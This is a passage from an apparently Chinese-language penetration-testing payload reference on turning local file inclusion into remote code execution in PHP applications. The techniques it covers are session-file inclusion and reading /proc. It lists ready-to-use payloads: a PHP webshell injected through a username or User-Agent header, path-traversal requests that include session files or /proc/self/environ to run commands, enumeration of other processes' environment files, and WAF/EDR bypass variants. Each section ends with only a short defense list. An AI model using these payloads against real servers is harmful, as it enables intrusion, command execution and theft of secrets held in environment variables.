/tmp/sess_[PHPSESSID]
/c:/windows/temp/sess_[PHPSESSID]
```
**语法解析：**
- `sess_` — Session文件前缀 _value_
- `PHPSESSID` — Session ID值 _value_

**2. 控制Session内容**
> 控制Session内容
```
# 通过用户输入控制Session
# 例如用户名、个人简介等
username: <?php system($_GET['c']); ?>

# 或通过Cookie
Set-Cookie: PHPSESSID=malicious
```
**语法解析：**
- `system()` — 系统命令执行 _function_

**3. 包含Session文件**
> 包含Session文件执行代码
```
# 包含Session文件
?file=/var/lib/php/sessions/sess_abc123&c=id

# 或使用相对路径
?file=../../../var/lib/php/sessions/sess_abc123&c=id
```
**语法解析：**
- `../` — 路径穿越 _path_

**4. Session竞争条件**
> 利用Session竞争条件
```
# 利用Session竞争
# 1. 持续写入恶意代码到Session
# 2. 同时包含Session文件
# 3. 在Session被清理前执行
```

**WAF/EDR 绕过变体：**

**Session ID预测**
> 预测Session ID
```
# 尝试预测Session ID
# 常见模式: md5(ip.time.random)
# 暴力枚举Session ID
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 尝试预测Session ID
# 常见模式: md5(ip.time.random)
# 暴力枚举Session ID` — 参数与载荷内容 _value_


**概述：** Session文件包含是LFI升级为RCE的重要技术，通过将恶意PHP代码注入Session文件，再利用LFI包含Session文件实现代码执行。Session文件路径通常可预测(如/tmp/sess_PHPSESSID)。

**漏洞原理：** PHP Session默认存储在文件系统中(/tmp/sess_xxx或/var/lib/php/sessions/sess_xxx)。当应用将用户可控数据(如用户名)存入Session时，攻击者注入PHP代码到Session变量中，再通过LFI包含对应的Session文件触发执行。

**利用方法：** 完整利用流程：
1. 找到Session存储路径
2. 控制Session内容
3. 包含Session文件
4. 执行代码

**防御措施：** 防御措施：
1. 限制Session内容
2. 使用安全的Session存储
3. 白名单验证文件名
4. 禁用文件包含

---

### Proc文件系统利用  `lfi-proc`
_利用/proc文件系统进行LFI攻击_
子类：**Proc文件系统** · tags: `lfi` `proc` `linux` `environ`

**前置条件：**
- 存在LFI漏洞
- Linux系统
- /proc可访问

**攻击链：**

**1. 读取进程信息**
> 读取当前进程信息
_platform: linux_
```
# 当前进程信息
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd
/proc/self/exe
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```
**语法解析：**
- `/proc/self/` — 当前进程目录 _path_
- `cmdline` — 启动命令 _value_
- `environ` — 环境变量 _value_
- `cwd` — 当前工作目录 _value_

**2. 读取环境变量**
> 读取环境变量执行代码
_platform: linux_
```
?file=../../../proc/self/environ

# 在User-Agent中注入
User-Agent: <?php system($_GET['c']); ?>

# 包含执行
?file=../../../proc/self/environ&c=id
```
**语法解析：**
- `system()` — 系统命令执行 _function_
- `../` — 路径穿越 _path_

**3. 通过fd读取日志**
> 通过fd读取日志
_platform: linux_
```
# fd文件描述符
/proc/self/fd/10
/proc/self/fd/20

# 尝试不同编号找到日志
?file=../../../proc/self/fd/10
```
**语法解析：**
- `../` — 路径穿越 _path_

**4. 读取其他进程**
> 读取其他进程信息
_platform: linux_
```
# 枚举进程
/proc/[pid]/cmdline
/proc/[pid]/environ
/proc/[pid]/maps

# 暴力枚举
?file=../../../proc/1/cmdline
?file=../../../proc/2/cmdline
```
**语法解析：**
- `../` — 路径穿越 _path_

**WAF/EDR 绕过变体：**

**使用self**
> 使用self引用
_platform: linux_
```
?file=/proc/self/environ
?file=proc/self/environ
```
**语法解析：**
- `?file=/proc/self/environ
?file=proc/self/environ` — 攻击载荷 _value_


**概述：** /proc文件系统(Linux虚拟文件系统)包含大量系统运行时信息，通过LFI读取/proc目录可获取进程信息、环境变量、网络配置等，/proc/self/environ更可能用于代码执行。

**漏洞原理：** /proc文件系统中的关键文件：/proc/self/environ包含当前进程的环境变量(可能包含密钥)、/proc/self/cmdline包含启动命令、/proc/self/fd/N可读取打开的文件描述符、/proc/net/tcp泄露网络连接信息和内网IP。

**利用方法：** 完整利用流程：
1. 探测/proc可访问性
2. 读取environ文件
3. 注入代码到User-Agent
4. 包含执行

**防御措施：** 防御措施：
1. 限制/proc访问
2. 白名单验证文件名
3. 过滤特殊字符
4. 使用chroot隔离

---
